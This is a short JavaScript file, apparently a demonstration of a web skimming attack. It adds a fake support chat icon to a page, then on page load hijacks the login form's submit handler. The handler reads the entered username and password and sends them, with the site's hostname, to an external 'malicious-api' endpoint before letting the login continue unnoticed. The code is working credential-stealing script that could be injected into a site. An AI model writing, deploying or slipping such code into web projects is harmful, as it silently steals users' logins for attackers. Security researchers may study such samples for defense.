var div = document.createElement('div');
div.className = 'chat';
var img = document.createElement('img');
img.src = 'http://chatbot.com:3000/imgs/chat-icon.png';
img.title = 'Get someone from support to help you';
div.appendChild(img);
document.body.appendChild(div);

function scheduleTampering() {
    console.log("schedule");
    setTimeout(AuthTampering, 10);
}
function AuthTampering(){
    console.log("authtampering");
    var f = document.querySelector('form#login-form');
    var o = f.onsubmit;

    f.onsubmit = function (event) {
        o && event.preventDefault();
        o && event.stopPropagation();
        var user = document.querySelector('input[name="id"]').value;
        var password = document.querySelector('input[name="password"]').value;    
        var messagedomain = window.location.hostname;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://malicious-api.jscrambler.com/addCredentials", false);
        xhr.setRequestHeader('content-type', 'application/json')
        const data = JSON.stringify({email: user, password: password, domain: messagedomain});
        xhr.send(data);
        o && o.call(this, event);
        return true;        
    };
}
window.addEventListener('load', scheduleTampering);